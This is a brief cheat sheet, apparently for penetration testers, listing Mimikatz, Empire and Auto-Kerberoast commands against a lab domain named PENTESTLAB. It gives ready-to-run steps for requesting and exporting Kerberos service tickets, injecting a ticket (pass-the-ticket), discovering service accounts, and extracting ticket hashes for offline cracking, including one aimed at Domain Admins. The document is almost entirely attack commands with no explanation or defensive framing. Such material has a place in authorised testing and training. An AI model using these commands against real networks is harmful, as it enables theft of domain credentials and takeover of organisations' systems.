# Mimikatz

**Service Ticket Request**
```
kerberos::ask /target:PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80
```
**List Available Tickets**
```
kerberos::list
```
**Export Service Tickets**
```
kerberos::list /export
```
**Inject Ticket**
```
kerberos::ptt PENTESTLAB.kirbi
```
# Empire

**SPN Discovery**
```
usemodule situational_awareness/network/get_spn
```
**Export Service Tickets**
```
usemodule credentials/mimikatz/extract_tickets
```
**Kerberoast**
```
usemodule credentials/invoke_kerberoast
```
# Auto-Kerberoast

**SPN Discovery**
```
List-UserSPNs
```
**Service Ticket Request & Hash Extraction**
```
Invoke-AutoKerberoast
```
**Service Ticket Request & Hash Extraction for Domain Admins**
```
Invoke-AutoKerberoast -GroupName "Domain Admins" -Domain pentestlab.local -HashFormat John
```
